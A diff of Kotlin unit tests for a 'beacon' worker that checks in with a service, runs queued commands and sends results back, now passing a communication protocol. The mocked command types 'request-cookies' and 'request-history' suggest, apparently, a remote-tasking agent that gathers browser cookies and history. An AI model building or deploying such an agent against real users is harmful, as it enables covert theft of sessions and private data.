@@ -93,8 +93,22 @@ class BeaconWorkerTest {
         val worker = createWorker()
         worker.doWork()
 
-        verify(mockBeaconService).sendResult(eq("t1"), any())
-        verify(mockBeaconService).sendResult(eq("t2"), any())
+        verify(mockBeaconService).sendResult(eq("t1"), eq("request-cookies"), any(), any())
+        verify(mockBeaconService).sendResult(eq("t2"), eq("request-history"), any(), any())
+    }
+
+    @Test
+    fun whenTasksExistThenPassesProtocolFromCheckIn() = runTest {
+        val cmd = PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap())
+        whenever(mockBeaconService.checkIn()).thenReturn(
+            CheckInResult(listOf(cmd), 15, communicationProtocol = "https")
+        )
+        whenever(mockCommandHandler.execute(any())).thenReturn("data")
+
+        val worker = createWorker()
+        worker.doWork()
+
+        verify(mockBeaconService).sendResult(any(), any(), any(), eq("https"))
     }
 
     // -----------------------------------------------------------------------
@@ -118,7 +132,8 @@ class BeaconWorkerTest {
         )
         whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(tasks, 15))
         whenever(mockCommandHandler.execute(any())).thenReturn("data")
-        whenever(mockBeaconService.sendResult(any(), any())).thenThrow(RuntimeException("Network error"))
+        whenever(mockBeaconService.sendResult(any(), any(), any(), any()))
+            .thenThrow(RuntimeException("Network error"))
 
         val worker = createWorker()
         val result = worker.doWork()
@@ -133,7 +148,7 @@ class BeaconWorkerTest {
         val worker = createWorker()
         worker.doWork()
 
-        verify(mockBeaconService, never()).sendResult(any(), any())
+        verify(mockBeaconService, never()).sendResult(any(), any(), any(), any())
         verify(mockCommandHandler, never()).execute(any())
     }
 
